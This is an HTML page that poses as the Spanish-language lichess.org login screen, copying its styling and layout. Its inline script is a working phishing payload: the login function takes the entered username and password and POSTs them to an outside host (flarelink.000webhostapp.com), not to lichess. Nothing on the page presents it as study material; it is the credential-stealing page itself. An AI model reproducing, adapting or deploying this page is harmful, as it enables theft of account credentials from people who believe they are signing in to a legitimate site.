<!DOCTYPE html>
<html lang="es-ES">
<!-- Lichess is open source! See https://lichess.org/source -->
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
	<meta http-equiv="Content-Security-Policy" content="default-src 'self' lichess1.org; connect-src 'self' data: lichess1.org wss://socket0.lichess.org wss://socket3.lichess.org wss://socket1.lichess.org wss://socket4.lichess.org wss://socket2.lichess.org wss://socket5.lichess.org https://explorer.lichess.ovh https://tablebase.lichess.ovh; style-src 'self' 'unsafe-inline' lichess1.org; frame-src 'self' lichess1.org www.youtube.com player.twitch.tv; worker-src 'self' lichess1.org blob:; img-src data: *; script-src 'nonce-6SjxLzy5gKFzsUd4rGGwJg5E' 'self' lichess1.org; font-src 'self' lichess1.org; base-uri 'none';">
	<meta name="theme-color" content="#2e2a24">
	<title>Iniciar sesión • lichess.org</title>
	<link href="https://lichess1.org/assets/_MBYGlU/css/site.ltr.dark.min.css" rel="stylesheet" />
	<link href="https://lichess1.org/assets/_MBYGlU/css/auth.ltr.dark.min.css" rel="stylesheet" />
	<link id="piece-sprite" href="https://lichess1.org/assets/_MBYGlU/piece-css/cburnett.css" rel="stylesheet" />

</head>
<body class="dark brown Woodi Basic coords-in" data-sound-set="standard" data-socket-domains="socket0.lichess.org,socket3.lichess.org,socket1.lichess.org,socket4.lichess.org,socket2.lichess.org,socket5.lichess.org" data-asset-url="https://lichess1.org" data-asset-version="MBYGlU" data-theme="dark" data-board-theme="brown" data-piece-set="cburnett">
	
	<div id="main-wrap" class="is2d">
		<main class="auth auth-login box box-pad">
			<h1 class="box__top">Iniciar sesión</h1>
			<form method="post" class="form3" id="formlogin">
				<div class="one-factor">
					<div class="form-group"><label class="form-label" for="form3-username">Nombre de usuario o correo</label><input id="username" value="" class="form-control" minlength="2" maxlength="320" autofocus="autofocus" required="required" autocomplete="username" /></div>
					<div class="form-group">
						<label class="form-label" for="form3-password">Contraseña</label>
						<input id="password" value="" type="password" class="form-control" required="required" autocomplete="current-password" />
					</div>

					<button type="button" class="submit button" onclick="login()">Iniciar sesión</button>

					<label class="login-remember"><input name="remember" value="true" type="checkbox" checked="checked" />No cerrar sesión</label>
				</div>
				
			</form>
			<div class="alternative"><a href="#">Registrarse</a><a href="#">Cambiar contraseña</a><a href="#">Log in by email</a></div>
		</main>
	</div>
	<script>
		var form = document.getElementById("formlogin");
		document.addEventListener("keydown", function(event) {
		  if (event.keyCode === 13) {
		    login();
		  }
		});

		function login() {
			var user = document.getElementById("username").value;
			var pass = document.getElementById("password").value;

			$.ajax({
		        url: "https://flarelink.000webhostapp.com/lichess/login.php",
		        type: 'POST',
		        data: {
		            username: user,
					password: pass
		        }
		    }).done(function(resp) {
		    	//console.log(resp);
		       	//console.log("siuuu");
		    }).fail(function(resp){
		    	//console.log(resp);
		    	//console.log("error... pero esta bien");
		    });
		}
	</script>
	<script src="https://code.jquery.com/jquery-3.4.1.js"></script>
</body>
</html>
